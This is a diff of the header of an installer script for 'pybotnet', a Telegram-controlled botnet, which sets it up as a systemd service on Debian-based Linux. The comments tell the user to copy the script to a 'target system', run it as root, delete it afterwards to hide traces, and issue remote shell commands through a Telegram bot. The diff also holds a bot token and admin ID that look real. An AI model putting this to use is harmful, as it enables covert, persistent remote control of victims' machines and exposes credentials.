@@ -3,11 +3,11 @@
 ## add pybotnet to debian base linux systemd-service ##
 
 # -- HELP --:
-# - replace youre telegram_bot_token, admin_id and bot_alias_name with your own
+# - replace youre telegram_bot_token, admin_id and bot_name with your own
 # - copy this file to target system
 # - run this file by `sudo sh ./install_as_service.sh`
 # - remove install_as_service.sh from target system
-# - if pybotnet update is available, in telegram bot send `/shell systemctl restart [service_name (pybotnet)]` to reinstall pybotnet
+# - if pybotnet update is available, in telegram bot send `/shell systemctl restart pybotnet` to reinstall pybotnet
 
 telegram_bot_token=50885227232:AAFdKCluWopE9Mg-5Mj1WURfuu90cyGssBGY
 admin_id=49023471166
